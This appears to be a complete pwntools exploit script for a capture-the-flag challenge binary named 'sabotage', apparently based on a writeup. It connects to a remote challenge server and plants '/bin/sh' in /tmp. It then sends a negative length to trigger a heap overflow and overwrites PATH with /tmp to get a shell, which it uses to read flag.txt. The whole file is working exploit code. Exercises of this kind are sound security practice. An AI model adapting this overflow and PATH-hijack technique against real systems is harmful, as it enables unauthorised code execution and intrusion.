from pwn import *

# Context setup
context.binary = './sabotage'

def start():
    if args.REMOTE:
        return remote('94.237.121.111', 48638)
    else:
        return process('./sabotage')

p = start()

# Step 1: Upload file to /tmp/panel using quantum_destabilizer (Option 2)
# The writeup shows using b'> ' as the delimiter for menu selection
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'point: ')
p.sendline(b'panel')
p.recvuntil(b'shield')
p.sendline(b'/bin/sh')

# Step 2: Access control panel (Option 1) and trigger heap overflow
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'length: ')
p.sendline(b'-1')
# Offset is 32 bytes (16 bytes chunk data + 8 bytes next header + 8 bytes next custom size)
p.recvuntil(b'code: ')
p.sendline(b'A' * 32 + b'PATH=/tmp\x00')

# Now we should have a shell
p.sendline(b'/bin/cat flag.txt')
p.interactive()
